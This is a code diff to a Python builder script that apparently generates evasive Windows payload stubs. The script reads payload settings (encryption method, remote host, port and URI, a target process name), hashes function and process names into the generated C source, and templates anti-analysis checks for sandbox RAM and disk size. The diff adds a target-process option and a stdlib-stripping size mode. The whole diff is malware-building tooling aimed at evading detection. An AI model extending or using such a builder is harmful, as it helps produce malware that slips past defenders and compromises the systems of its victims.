@@ -17,8 +17,10 @@ def is_set(value):
     return value != None and value != ""
 
 ENCRYPTION_METHOD = config.get("Payload", "encryption_method")
+TARGET_PROCESS = config.get("Payload", "target_process")
 
 STUB_FILE = config.get("Stub", "filename")
+PRIORIZE_SIZE = config.getboolean("Stub", "priorize_size")
 
 DISK_SIZE = config.get("Anti-Analysis", "disk_size")
 RAM_SIZE = config.get("Anti-Analysis", "ram_size")
@@ -47,6 +49,17 @@ def main():
     RHOST = config.get("Payload", "rhost") if is_set(config.get("Payload", "rhost")) else None
     RPORT = config.getint("Payload", "rport") if is_set(config.get("Payload", "rport")) else None
     RURI = config.get("Payload", "ruri") if is_set(config.get("Payload", "ruri")) else None
+
+    if PRIORIZE_SIZE:
+        # no stdlib
+        sed_files(WORKING_FOLDER, "int WinMain(", "int WinMainCRTStartup(")
+        sed_files(WORKING_FOLDER, "strlen(", "custom_strlen(",[".c"])
+        sed_files(WORKING_FOLDER, "strcmp(", "custom_strcmp(",[".c"])
+        sed_files(WORKING_FOLDER, "strncpy(", "custom_strncpy(",[".c"])
+        sed_files(WORKING_FOLDER, "srand((", "// srand(")
+        sed_files(WORKING_FOLDER, "rand()", f"{random.randint(0, 0xFFFF)}")
+        sed_files(WORKING_FOLDER, "printf(", "// printf(")
+
 
 
     if is_set(config.get("Payload", "name")):
@@ -99,7 +112,10 @@ def main():
             if parts[0] == "MODHASH": # definitions.c
                 sed_file(WORKING_FOLDER+filename, tag, hash_obj(parts[1],""))
             if parts[0] == "FCTHASH": # definitions.c
-                sed_file(WORKING_FOLDER+filename, tag, hash_obj("", parts[1]))
+                if parts[1] == "target_process":
+                    sed_file(WORKING_FOLDER+filename, tag, hash_obj("", TARGET_PROCESS))
+                else:
+                    sed_file(WORKING_FOLDER+filename, tag, hash_obj("", parts[1]))
             if parts[0] == "SANDBOX":
                 if parts[1] == "RAM_CHECK":
                     if is_set(RAM_SIZE):
